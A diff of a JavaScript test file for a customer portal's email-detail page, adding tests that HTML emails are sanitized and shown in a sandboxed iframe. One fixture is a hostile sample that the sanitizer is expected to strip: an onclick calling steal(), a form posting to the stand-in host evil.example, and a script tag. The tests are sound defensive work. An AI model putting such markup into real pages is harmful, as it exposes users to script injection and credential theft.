@@ -256,12 +256,46 @@ describe("portal email detail", () => {
     expect(document.body.textContent).not.toContain("path.pdf");
   });
 
-  it("showBody = false / showAttachments = false: nothing of that is rendered", async () => {
+  it("showBody = false / showAttachments = false: nothing of that is rendered, and the page says the content is not shown", async () => {
     renderPortal(`/portal/email/${DELIVERY}`, fakeApi({ email: vi.fn(async () => detail({ body: null, attachments: null })) }));
     await screen.findByRole("heading", { name: "Tu código de acceso" });
     expect(screen.queryByTitle("Contenido del correo")).not.toBeInTheDocument();
     expect(screen.queryByText(/tu código es/i)).not.toBeInTheDocument();
     expect(screen.queryByText("Archivos adjuntos")).not.toBeInTheDocument();
+    expect(screen.getByText("El contenido completo de este correo no se muestra en el portal.")).toBeInTheDocument();
+  });
+
+  it("HTML email: the original formatting and the verification code inside the sanitized, sandboxed iframe", async () => {
+    const html =
+      '<html><head><style>.c{font-size:28px}</style></head><body><table><tr><td><h2>Netflix</h2><p class="c"><b>482913</b></p>' +
+      '<a href="https://www.netflix.com/login" onclick="steal()">Iniciar sesión</a><img src="https://cdn.example/l.png"></td></tr></table>' +
+      '<form action="https://evil.example"><input name="p"></form><script>alert(1)</script></body></html>';
+    renderPortal(`/portal/email/${DELIVERY}`, fakeApi({ email: vi.fn(async () => detail({ body: { text: null, html } })) }));
+    const frame = await screen.findByTitle("Contenido del correo");
+    const srcdoc = frame.getAttribute("srcdoc") ?? "";
+    expect(srcdoc).toContain('<p class="c"><b>482913</b></p>');
+    expect(srcdoc).toContain("<style>.c{font-size:28px}</style>");
+    expect(srcdoc).toContain('href="https://www.netflix.com/login"');
+    expect(srcdoc).toContain('rel="noopener noreferrer"');
+    expect(srcdoc).toContain("img-src data: cid:;"); // remote images blocked until the customer asks
+    expect(srcdoc).not.toMatch(/<script|onclick|<form|<input|steal\(/);
+    expect(frame.getAttribute("sandbox")).not.toMatch(/allow-scripts|allow-same-origin|allow-forms|allow-top-navigation/);
+    expect(screen.getByRole("button", { name: /Imágenes remotas bloqueadas/ })).toBeInTheDocument();
+  });
+
+  it("plain-text email: the full text with its verification code, no iframe", async () => {
+    const text = ["Hola Juan,", "Tu código de verificación es 731904.", "Si no fuiste tú, ignora este mensaje."].join("\n");
+    renderPortal(`/portal/email/${DELIVERY}`, fakeApi({ email: vi.fn(async () => detail({ body: { text, html: null } })) }));
+    expect(await screen.findByText(/Tu código de verificación es 731904/)).toBeInTheDocument();
+    expect(screen.getByText(/Si no fuiste tú, ignora este mensaje/)).toBeInTheDocument();
+    expect(screen.queryByTitle("Contenido del correo")).not.toBeInTheDocument();
+  });
+
+  it("shared body without stored content: 'not available', never an empty box", async () => {
+    renderPortal(`/portal/email/${DELIVERY}`, fakeApi({ email: vi.fn(async () => detail({ body: { text: null, html: null } })) }));
+    expect(await screen.findByText("El contenido de este correo no está disponible.")).toBeInTheDocument();
+    expect(screen.queryByTitle("Contenido del correo")).not.toBeInTheDocument();
+    expect(screen.queryByText("(sin contenido de texto)")).not.toBeInTheDocument();
   });
 
   it("an empty attachment list and hidden / missing fields", async () => {
